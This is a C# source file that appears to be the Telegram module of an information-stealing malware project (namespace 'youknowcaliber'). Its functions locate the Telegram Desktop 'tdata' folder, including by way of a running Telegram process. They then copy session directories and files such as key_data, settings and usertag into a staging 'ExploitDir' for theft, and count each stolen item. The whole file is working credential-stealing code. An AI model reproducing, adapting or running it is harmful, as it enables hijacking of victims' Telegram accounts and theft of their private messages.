﻿using System;
using System.Diagnostics;
using System.IO;

namespace youknowcaliber
{
	internal class Telegram
	{
		public static void CopyDirectory(string sourceFolder, string destFolder)
		{
			bool flag = !Directory.Exists(destFolder);
			if (flag)
			{
				Directory.CreateDirectory(destFolder);
			}
			string[] files = Directory.GetFiles(sourceFolder);
			foreach (string text in files)
			{
				string fileName = Path.GetFileName(text);
				string destFileName = Path.Combine(destFolder, fileName);
				File.Copy(text, destFileName);
			}
			string[] directories = Directory.GetDirectories(sourceFolder);
			foreach (string text2 in directories)
			{
				string fileName2 = Path.GetFileName(text2);
				string destFolder2 = Path.Combine(destFolder, fileName2);
				Filemanager.CopyDirectory(text2, destFolder2);
			}
		}

		private static string GetTdata()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
			Process[] processesByName = Process.GetProcessesByName("Telegram");
			bool flag = processesByName.Length == 0;
			string result;
			if (flag)
			{
				result = text;
			}
			else
			{
				result = Path.Combine(Path.GetDirectoryName(ProcessList.ProcessExecutablePath(processesByName[0])), "tdata");
			}
			return result;
		}

		public static void GetTelegramSessions()
		{
			string text = Help.ExploitDir;
			string tdata = Telegram.GetTdata();
			try
			{
				bool flag = !Directory.Exists(tdata);
				if (!flag)
				{
					text += "\\Telegram";
					Directory.CreateDirectory(text);
					string[] directories = Directory.GetDirectories(tdata);
					string[] files = Directory.GetFiles(tdata);
					foreach (string text2 in directories)
					{
						string name = new DirectoryInfo(text2).Name;
						bool flag2 = name.Length == 16;
						if (flag2)
						{
							string destFolder = Path.Combine(text, name);
							Telegram.CopyDirectory(text2, destFolder);
						}
					}
					foreach (string fileName in files)
					{
						FileInfo fileInfo = new FileInfo(fileName);
						string name2 = fileInfo.Name;
						string destFileName = Path.Combine(text, name2);
						bool flag3 = fileInfo.Length > 5120L;
						if (!flag3)
						{
							bool flag4 = name2.EndsWith("s") && name2.Length == 17;
							if (flag4)
							{
								fileInfo.CopyTo(destFileName);
							}
							else
							{
								bool flag5 = name2.StartsWith("usertag") || name2.StartsWith("settings") || name2.StartsWith("key_data");
								if (flag5)
								{
									fileInfo.CopyTo(destFileName);
								}
								Counting.Telegram++;
							}
						}
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
	}
}
